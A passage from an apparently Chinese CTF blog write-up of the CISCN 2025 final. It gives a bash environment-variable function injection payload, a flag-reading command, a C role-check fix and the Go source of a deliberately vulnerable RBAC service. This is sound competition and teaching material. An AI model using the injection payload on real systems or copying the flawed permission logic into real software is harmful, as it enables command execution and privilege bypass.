<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"./admin.php"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>明显是p神的环境变量注入，这里用的是 <code>BASH_FUNC_ECHO()=()&#123; id; &#125;</code></p>
<p>结果我卡在最后的rce没做出来，第二天环境还在想了五分钟秒了</p>
<p>dir列出目录发现 flag 为 f1ag，直接用 php 读：<code>php /*1*</code></p>
<hr>
<h2 id="easy-can"><a href="#easy-can" class="headerlink" title="easy_can"></a>easy_can</h2><p><img src="/blog/2025/07/21/CISCN-2025-Final/59c7bf7f-de6e-43d8-9ec4-0be01ca25908.png"></p>
<p><img src="/blog/2025/07/21/CISCN-2025-Final/958e8a5c-668b-440b-b9b2-9bd9d83be2da.png"></p>
<p>flag{00000188040000000200000000000000}</p>
<hr>
<h1 id="CTF-day2"><a href="#CTF-day2" class="headerlink" title="CTF-day2"></a>CTF-day2</h1><h2 id="PIK证书签发"><a href="#PIK证书签发" class="headerlink" title="PIK证书签发"></a>PIK证书签发</h2><p>仔细看看文档，我们只需要验证用户角色的字符串与内置数据库的Enum是否一致。其实就几行代码的事。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">proc_pik_usercheck</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> sub_proc<span class="token punctuation">,</span><span class="token function">RECORD</span><span class="token punctuation">(</span>GENERAL_RETURN<span class="token punctuation">,</span>STRING<span class="token punctuation">)</span> <span class="token operator">*</span> keyevent_cmd<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span> recv_msg<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> ret<span class="token punctuation">;</span> 
    <span class="token function">RECORD</span><span class="token punctuation">(</span>TCM_PIK_DESC<span class="token punctuation">,</span>USERINFO<span class="token punctuation">)</span> <span class="token operator">*</span> pik_userinfo<span class="token punctuation">;</span>
    <span class="token function">RECORD</span><span class="token punctuation">(</span>USER_DEFINE<span class="token punctuation">,</span>SERVER_STATE<span class="token punctuation">)</span> <span class="token operator">*</span> server_state<span class="token punctuation">;</span>
    <span class="token keyword">char</span> user_name<span class="token punctuation">[</span>DIGEST_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    MSG_EXPAND <span class="token operator">*</span> msg_expand<span class="token punctuation">;</span>
	

    <span class="token comment">// get userinfo from pik req information</span>
    ret <span class="token operator">=</span> <span class="token function">message_get_define_expand</span><span class="token punctuation">(</span>recv_msg<span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_expand<span class="token punctuation">,</span><span class="token function">TYPE_PAIR</span><span class="token punctuation">(</span>TCM_PIK_DESC<span class="token punctuation">,</span>USERINFO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>ret<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>msg_expand <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
	    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    pik_userinfo<span class="token operator">=</span>msg_expand<span class="token operator">-></span>expand<span class="token punctuation">;</span>

    <span class="token function">print_cubeaudit</span><span class="token punctuation">(</span><span class="token string">"enter pik_usercheck function!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



    <span class="token comment">// get userinfo from local information</span>
    DB_RECORD <span class="token operator">*</span> db_record<span class="token punctuation">;</span>
    db_record <span class="token operator">=</span> <span class="token function">memdb_find_first</span><span class="token punctuation">(</span><span class="token function">TYPE_PAIR</span><span class="token punctuation">(</span>USER_DEFINE<span class="token punctuation">,</span>SERVER_STATE<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"user_name"</span><span class="token punctuation">,</span>pik_userinfo<span class="token operator">-></span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>db_record <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
    server_state <span class="token operator">=</span> db_record<span class="token operator">-></span>record<span class="token punctuation">;</span>

    <span class="token comment">// compare pikreq's user role with server_state's role</span>
    <span class="token comment">// if it is different, then stop pikcert process and return -EINVAL;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"userinfo role is %s server_state role is %d \n"</span><span class="token punctuation">,</span>pik_userinfo<span class="token operator">-></span>user_role<span class="token punctuation">,</span>server_state<span class="token operator">-></span>role<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> urole<span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>pik_userinfo<span class="token operator">-></span>user_role<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'A'</span><span class="token punctuation">)</span>urole<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>pik_userinfo<span class="token operator">-></span>user_role<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'U'</span><span class="token punctuation">)</span>urole<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>pik_userinfo<span class="token operator">-></span>user_role<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'G'</span><span class="token punctuation">)</span>urole<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span>urole<span class="token operator">!=</span>server_state<span class="token operator">-></span>role<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wtf\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

    ret<span class="token operator">=</span><span class="token function">ex_module_sendmsg</span><span class="token punctuation">(</span>sub_proc<span class="token punctuation">,</span>recv_msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/07/21/CISCN-2025-Final/ca7f347d-48b9-4eee-ba5b-7ef3c2d5f3b7.png"></p>
<h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><h2 id="web-rbac"><a href="#web-rbac" class="headerlink" title="web-rbac"></a>web-rbac</h2><p><code>docker load &lt; rbac.tar</code> 导入 tar 包，<code>docker run -p 8080:80 rbac</code> 映射 80 端口</p>
<p>源码在 &#x2F;app 下</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
        <span class="token string">"errors"</span>
        <span class="token string">"os"</span>
        <span class="token string">"path/filepath"</span>
        <span class="token string">"strings"</span>

        <span class="token string">"github.com/gin-gonic/gin"</span>
<span class="token punctuation">)</span>

<span class="token keyword">var</span> RBACList <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>

<span class="token keyword">type</span> ResTemplate <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
        Success <span class="token builtin">bool</span>
        Data    any
<span class="token punctuation">&#125;</span>

<span class="token keyword">type</span> ExecStruct <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
        File      <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
        Directory <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
        Pwd       <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
        Flag      <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
        FuncName  <span class="token builtin">string</span>
        Param     <span class="token builtin">string</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token function">initRBAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                htmlContent<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
                        c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Error loading HTML file"</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span>
                <span class="token punctuation">&#125;</span>

                c<span class="token punctuation">.</span>Writer<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>htmlContent<span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

        r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/getCurrentRBAC"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">var</span> response ResTemplate
                <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                        response <span class="token operator">=</span> ResTemplate<span class="token punctuation">&#123;</span>
                                Success<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                                Data<span class="token punctuation">:</span>    RBACList<span class="token punctuation">,</span>
                        <span class="token punctuation">&#125;</span>
                        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        response <span class="token operator">=</span> ResTemplate<span class="token punctuation">&#123;</span>
                                Success<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                        <span class="token punctuation">&#125;</span>
                        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>

                <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

        r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/execSysFunc"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">var</span> execStruct ExecStruct
                <span class="token keyword">var</span> response ResTemplate
                err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>execStruct<span class="token punctuation">)</span>
                <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
                        response <span class="token operator">=</span> ResTemplate<span class="token punctuation">&#123;</span>
                                Success<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                                Data<span class="token punctuation">:</span>    <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                        <span class="token punctuation">&#125;</span>
                        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span>

                <span class="token comment">// permission grant</span>
                RBACToGrant <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>
                <span class="token keyword">var</span> value <span class="token builtin">string</span>
                maxDeep <span class="token operator">:=</span> <span class="token number">0</span>

                <span class="token keyword">if</span> execStruct<span class="token punctuation">.</span>Directory <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token keyword">range</span> execStruct<span class="token punctuation">.</span>Directory <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>
                                        RBACToGrant<span class="token punctuation">[</span><span class="token string">"directory:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                                        maxDeep<span class="token operator">++</span>
                                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">break</span>
                                <span class="token punctuation">&#125;</span>

                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> execStruct<span class="token punctuation">.</span>Flag <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token keyword">range</span> execStruct<span class="token punctuation">.</span>Flag <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>
                                        RBACToGrant<span class="token punctuation">[</span><span class="token string">"flag:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                                        maxDeep<span class="token operator">++</span>
                                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">break</span>
                                <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> execStruct<span class="token punctuation">.</span>Pwd <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token keyword">range</span> execStruct<span class="token punctuation">.</span>Pwd <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>
                                        RBACToGrant<span class="token punctuation">[</span><span class="token string">"pwd:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                                        maxDeep<span class="token operator">++</span>
                                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">break</span>
                                <span class="token punctuation">&#125;</span>

                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>

                <span class="token keyword">if</span> execStruct<span class="token punctuation">.</span>File <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>

                        <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token keyword">range</span> execStruct<span class="token punctuation">.</span>File <span class="token punctuation">&#123;</span>
                                <span class="token comment">// Grant temporary file:return permissions</span>
                                <span class="token keyword">if</span> value <span class="token operator">==</span> <span class="token string">"return"</span> <span class="token operator">&amp;&amp;</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token punctuation">&#123;</span>
                                                RBACToGrant<span class="token punctuation">[</span><span class="token string">"rbac:change_return:1"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                                                RBACToGrant<span class="token punctuation">[</span><span class="token string">"file:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                                                RBACToGrant<span class="token punctuation">[</span><span class="token string">"rbac:change_return:0"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                                                maxDeep <span class="token operator">+=</span> <span class="token number">3</span>
                                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                                <span class="token keyword">break</span>
                                        <span class="token punctuation">&#125;</span>

                                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>
                                                RBACToGrant<span class="token punctuation">[</span><span class="token string">"file:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                                                maxDeep<span class="token operator">++</span>
                                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                                <span class="token keyword">break</span>
                                        <span class="token punctuation">&#125;</span>

                                <span class="token punctuation">&#125;</span>

                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token function">updateRBAC</span><span class="token punctuation">(</span>RBACToGrant<span class="token punctuation">)</span>
                result<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">execCommand</span><span class="token punctuation">(</span>execStruct<span class="token punctuation">.</span>FuncName<span class="token punctuation">,</span> execStruct<span class="token punctuation">.</span>Param<span class="token punctuation">)</span>
                <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
                        response <span class="token operator">=</span> ResTemplate<span class="token punctuation">&#123;</span>
                                Success<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                                Data<span class="token punctuation">:</span>    <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                        <span class="token punctuation">&#125;</span>
                        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>

                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        response <span class="token operator">=</span> ResTemplate<span class="token punctuation">&#123;</span>
                                Success<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                                Data<span class="token punctuation">:</span>    <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"result"</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                        <span class="token punctuation">&#125;</span>
                        <span class="token function">initRBAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">initRBAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        RBACList <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"file:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"flag:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"flag:return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"pwd:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"directory:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"directory:return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"rbac:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
        RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">updateRBAC</span><span class="token punctuation">(</span>RBACToGrant <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token operator">:=</span> <span class="token keyword">range</span> RBACToGrant <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">":read"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                                RBACList<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">":return"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                                RBACList<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">"rbac:change_return:1"</span> <span class="token punctuation">&#123;</span>
                        RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>

                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">"rbac:change_return:0"</span> <span class="token punctuation">&#123;</span>
                        RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>

                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        RBACList<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
                <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">execCommand</span><span class="token punctuation">(</span>funcName <span class="token builtin">string</span><span class="token punctuation">,</span> param <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

        <span class="token keyword">if</span> funcName <span class="token operator">==</span> <span class="token string">"getPwd"</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"pwd:read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                        pwd<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> pwd<span class="token punctuation">,</span> err

                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">return</span> <span class="token string">"No Permission"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> funcName <span class="token operator">==</span> <span class="token string">"getDirectory"</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// read directory</span>
                <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"directory:read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">var</span> fileNames <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
                        err <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Walk</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>path <span class="token builtin">string</span><span class="token punctuation">,</span> info os<span class="token punctuation">.</span>FileInfo<span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>
                                fileNames <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>fileNames<span class="token punctuation">,</span> info<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                                <span class="token keyword">return</span> <span class="token boolean">nil</span>
                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">,</span> err
                        <span class="token punctuation">&#125;</span>
                        directoryFiles <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>fileNames<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span>
                        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"directory:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">return</span> directoryFiles<span class="token punctuation">,</span> <span class="token boolean">nil</span>
                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
